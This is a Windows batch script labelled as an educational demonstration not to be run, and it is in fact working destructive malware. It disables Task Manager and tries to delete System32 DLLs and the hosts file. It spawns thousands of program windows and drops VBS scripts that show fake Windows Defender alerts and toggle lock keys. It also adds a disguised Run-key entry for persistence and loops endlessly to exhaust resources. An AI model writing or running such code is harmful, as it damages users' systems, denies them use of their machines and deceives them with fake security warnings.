:: malicious_demo.bat
:: Educational demonstration only - DO NOT RUN
@echo off

:: Disable Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Attempt to delete system files (will likely fail due to permissions)
del /f /q /s C:\Windows\System32\*.dll >nul 2>&1
del /f /q C:\Windows\System32\drivers\etc\hosts >nul 2>&1

:: Spawn 1000 instances of Notepad, Paint, and Calculator
set count=0
:loop
start notepad.exe
start mspaint.exe
start calc.exe
set /a count+=1
if %count% lss 1000 goto loop

:: Visual effects with CMD color changes
color 0a
for /l %%X in (1,1,50) do (
  color %%X
  cls
  echo "YOUR SYSTEM IS COMPROMISED"
  timeout /t 0.1 >nul
)

:: Generate and execute VBS error spam
echo Set WshShell = CreateObject("WScript.Shell") > %temp%\errorSpam.vbs
echo For i = 1 to 100 >> %temp%\errorSpam.vbs
echo WshShell.Popup "CRITICAL ERROR! FILE CORRUPTED ON DEVICE: C", 1+16, "WINDOWS DEFENDER ALERT" >> %temp%\errorSpam.vbs
echo Next >> %temp%\errorSpam.vbs

start %temp%\errorSpam.vbs

:: Keyboard disruption via key presses
echo Set shell=Wscript.CreateObject("Wscript.Shell") > %temp%\keyMess.vbs
echo Set WshShell = CreateObject("WScript.Shell") >> %temp%\keyMess.vbs
echo Do >> %temp%\keyMess.vbs
echo shell.SendKeys "{CAPSLOCK}" >> %temp%\keyMess.vbs
echo shell.SendKeys "{NUMLOCK}" >> %temp%\keyMess.vbs
echo shell.SendKeys "{SCROLLLOCK}" >> %temp%\keyMess.vbs
echo Wscript.Sleep 100 >> %temp%\keyMess.vbs
echo Loop >> %temp%\keyMess.vbs

start %temp%\keyMess.vbs

:: Hide output
>>nul 2>&1

:: Add persistence via registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemRepair" /t REG_SZ /d "%0" /f

:: Resource exhaustion loop
:endless
start charmap.exe
start defrag C: /u
goto endless